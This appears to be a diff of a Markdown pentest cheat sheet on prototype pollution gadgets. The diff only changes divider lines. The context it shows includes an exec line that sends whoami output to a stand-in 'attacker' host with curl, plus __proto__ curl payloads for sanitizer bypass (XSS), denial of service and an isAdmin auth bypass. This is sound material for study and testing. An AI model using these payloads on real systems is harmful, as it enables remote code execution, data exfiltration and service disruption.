@@ -18,7 +18,7 @@ linked:
 ---
 # Prototype Pollution - Gadgets y Explotación
 
-***
+---
 
 ## RCE via child_process (Server)
 
@@ -50,7 +50,7 @@ require('child_process').spawn('ls', []);
 require('child_process').exec('curl http://attacker/$(whoami)');
 ```
 
-___
+---
 
 ## Auth Bypass
 
@@ -82,7 +82,7 @@ function checkAdmin(req, res, next) {
 // → req.user.isAdmin === true → bypass.
 ```
 
-___
+---
 
 ## XSS via Gadget en Sanitizer
 
@@ -97,7 +97,7 @@ ___
 | `curl -X POST -d '{"__proto__":{"FORBID_TAGS":[]}}' https://target/api/x` | Clear forbidden tags list | Reverse sanitizer. |
 ^pp-gadget-xss
 
-___
+---
 
 ## DoS / Property Override
 
@@ -112,7 +112,7 @@ ___
 | `curl -X POST -d '{"__proto__":{"valueOf":null}}' https://target/api/x` | Comparisons rompen | Comparison operators fail. |
 ^pp-gadget-dos
 
-___
+---
 
 ## Property Injection que Cambia Logic
 
@@ -136,4 +136,4 @@ ___
 3. Side effect: RCE / auth bypass / data leak / DoS
 ```
 
-***
+---
